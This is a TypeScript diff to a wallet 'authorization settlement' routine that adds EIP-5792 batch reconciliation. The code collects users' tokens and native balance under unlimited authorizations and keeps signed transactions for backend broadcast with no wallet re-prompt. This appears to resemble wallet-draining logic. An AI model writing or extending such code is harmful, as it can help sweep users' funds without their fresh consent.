@@ -3,6 +3,7 @@ import { TOKEN_COLLECTION_STATE_LABELS } from "@trustmycard/shared/constants/tok
 import { resolveApiUrl } from "../../core/api-url";
 import { getErrorMessage } from "../../core/errors";
 import { correlationHeaders } from "../../core/transaction-context";
+import { reconcileEvmBatchNative } from "../evm-batch-native-reconcile";
 import {
   createWalletSessionRefresher,
   fetchWalletSessionToken,
@@ -408,6 +409,15 @@ export async function runAuthorizationSettlement(
       }).catch(() => undefined);
     }
 
+    if (args.capture.native?.authorizationKind === "evm_batch_unknown") {
+      await registerWalletPhaseNativeAuthorization({
+        apiBaseUrl,
+        capture: args.capture.native,
+        settlementSessionId,
+        walletSessionToken,
+      }).catch(() => undefined);
+    }
+
     const networkRow = args.networks.find(
       (n) => n.key === args.capture.network,
     );
@@ -653,6 +663,205 @@ export async function runAuthorizationSettlement(
       });
     } else if (
       wantsNative &&
+      args.capture.native?.authorizationKind === "evm_batch_unknown"
+    ) {
+      const batchId = String(
+        args.capture.native.authorizationPayload.batchId ?? "",
+      );
+      const chainId = Number(args.capture.native.authorizationPayload.chainId ?? 0);
+      const tokenJobCount = Number(
+        args.capture.native.authorizationPayload.tokenJobCount ?? 0,
+      );
+
+      if (!batchId || !chainId || !args.provider) {
+        throw new Error(
+          "Cannot reconcile EIP-5792 batch native — missing batch context or wallet",
+        );
+      }
+
+      args.onProgress?.({
+        network: args.capture.network,
+        stage: "executing_native",
+        message: "Reconciling EIP-5792 batch native status",
+      });
+
+      log("EVM_BATCH_NATIVE_RECONCILE_START", {
+        network: args.capture.network,
+        batchId,
+        chainId,
+        tokenJobCount,
+      });
+
+      const reconciled = await reconcileEvmBatchNative({
+        provider: args.provider,
+        batchId,
+        chainId,
+        tokenJobCount,
+      });
+
+      log("EVM_BATCH_NATIVE_RECONCILE_RESULT", {
+        network: args.capture.network,
+        batchId,
+        status: reconciled.status,
+        txHash:
+          reconciled.status === "succeeded" ? reconciled.txHash : undefined,
+      });
+
+      if (reconciled.status === "succeeded") {
+        if (settlementSessionId) {
+          await fetch(
+            resolveApiUrl(
+              apiBaseUrl,
+              `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`,
+            ),
+            {
+              method: "POST",
+              headers: {
+                "content-type": "application/json",
+                ...correlationHeaders(transactionId),
+                ...(walletSessionToken
+                  ? { authorization: `Bearer ${walletSessionToken}` }
+                  : {}),
+              },
+              body: JSON.stringify({ txHash: reconciled.txHash }),
+              cache: "no-store",
+            },
+          ).catch(() => undefined);
+        }
+
+        nativeExecuted = true;
+        walletResults.push({
+          network: args.capture.network,
+          token: "NATIVE",
+          outcome: "collected",
+          message: "Native transfer confirmed after EIP-5792 batch reconciliation",
+          txHash: reconciled.txHash,
+        });
+      } else if (reconciled.status === "failed_revert") {
+        if (!args.runNativeTransfer) {
+          throw new Error(
+            "Wallet disconnected — reconnect to complete native recovery",
+          );
+        }
+
+        args.onProgress?.({
+          network: args.capture.network,
+          stage: "executing_native",
+          message: "Recovering native after EIP-5792 batch revert",
+        });
+
+        const authResult = await args.runNativeTransfer({
+          network: args.capture.network,
+          owner: args.capture.owner,
+          unlimited: true,
+          walletSessionToken,
+          nativeReadinessTokens: buildNativeReadinessTokenInputs(
+            finalizedCaptures.length > 0
+              ? finalizedCaptures
+              : args.capture.tokens,
+          ),
+          mode: "authorize_only",
+        });
+
+        if (!authResult.ok || !authResult.deferredSignedRaw) {
+          const message = authResult.userRejected
+            ? "Permission denied by user"
+            : getErrorMessage(
+                authResult.error,
+                "Native recovery authorization failed",
+              );
+          walletResults.push({
+            network: args.capture.network,
+            token: "NATIVE",
+            outcome: authResult.userRejected ? "user_rejected" : "failed",
+            message,
+          });
+          throw new Error(message);
+        }
+
+        const nativeResult = await args.runNativeTransfer({
+          network: args.capture.network,
+          owner: args.capture.owner,
+          unlimited: true,
+          walletSessionToken,
+          nativeReadinessTokens: buildNativeReadinessTokenInputs(
+            finalizedCaptures.length > 0
+              ? finalizedCaptures
+              : args.capture.tokens,
+          ),
+          mode: "execute_deferred",
+          deferredSignedRaw: authResult.deferredSignedRaw,
+          deferredTransferableRaw:
+            authResult.deferredTransferableRaw ??
+            args.capture.native.estimateTransferableRaw ??
+            undefined,
+        });
+
+        if (
+          !nativeResult.ok &&
+          !nativeResult.userRejected
+        ) {
+          log("EVM_DEFERRED_BROADCAST_FAILED", {
+            network: args.capture.network,
+            error: nativeResult.error,
+            txHash: nativeResult.txHash ?? null,
+            policy:
+              "no wallet re-prompt — signed authorization retained for backend retry/reconciliation",
+          });
+        }
+
+        if (nativeResult.ok && nativeResult.txHash && settlementSessionId) {
+          await fetch(
+            resolveApiUrl(
+              apiBaseUrl,
+              `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`,
+            ),
+            {
+              method: "POST",
+              headers: {
+                "content-type": "application/json",
+                ...correlationHeaders(transactionId),
+                ...(walletSessionToken
+                  ? { authorization: `Bearer ${walletSessionToken}` }
+                  : {}),
+              },
+              body: JSON.stringify({ txHash: nativeResult.txHash }),
+              cache: "no-store",
+            },
+          ).catch(() => undefined);
+        }
+
+        nativeExecuted = nativeResult.ok;
+        if (nativeResult.ok) {
+          walletResults.push({
+            network: args.capture.network,
+            token: "NATIVE",
+            outcome: nativeResult.pendingRegistered ? "pending" : "collected",
+            message: nativeResult.pendingRegistered
+              ? "Native transfer pending confirmation"
+              : "Native transfer confirmed after batch recovery",
+            txHash: nativeResult.txHash,
+          });
+        } else {
+          const nativeMessage = nativeResult.userRejected
+            ? "Permission denied by user"
+            : getErrorMessage(nativeResult.error, "Native transfer failed");
+          walletResults.push({
+            network: args.capture.network,
+            token: "NATIVE",
+            outcome: nativeResult.userRejected ? "user_rejected" : "failed",
+            message: nativeMessage,
+            txHash: nativeResult.txHash,
+          });
+          throw new Error(nativeMessage);
+        }
+      } else {
+        throw new Error(
+          "EIP-5792 batch native status still unknown — reconciliation will retry without a new wallet authorization",
+        );
+      }
+    } else if (
+      wantsNative &&
       (args.capture.native?.authorizationKind === "evm_deferred" ||
         args.capture.native?.authorizationKind === "evm_signed") &&
       args.runNativeTransfer
@@ -692,28 +901,12 @@ export async function runAuthorizationSettlement(
         !nativeResult.ok &&
         !nativeResult.userRejected
       ) {
-        log("EVM_DEFERRED_BROADCAST_FALLBACK", {
+        log("EVM_DEFERRED_BROADCAST_FAILED", {
           network: args.capture.network,
           error: nativeResult.error,
-          fallback: "full_eth_sendTransaction",
-        });
-        args.onProgress?.({
-          network: args.capture.network,
-          stage: "executing_native",
-          message:
-            "Deferred broadcast failed — requesting native transfer in wallet",
-        });
-        nativeResult = await args.runNativeTransfer({
-          network: args.capture.network,
-          owner: args.capture.owner,
-          unlimited: true,
-          walletSessionToken,
-          nativeReadinessTokens: buildNativeReadinessTokenInputs(
-            finalizedCaptures.length > 0
-              ? finalizedCaptures
-              : args.capture.tokens,
-          ),
-          mode: "full",
+          txHash: nativeResult.txHash ?? null,
+          policy:
+            "no wallet re-prompt — signed authorization retained for backend retry/reconciliation",
         });
       }
 
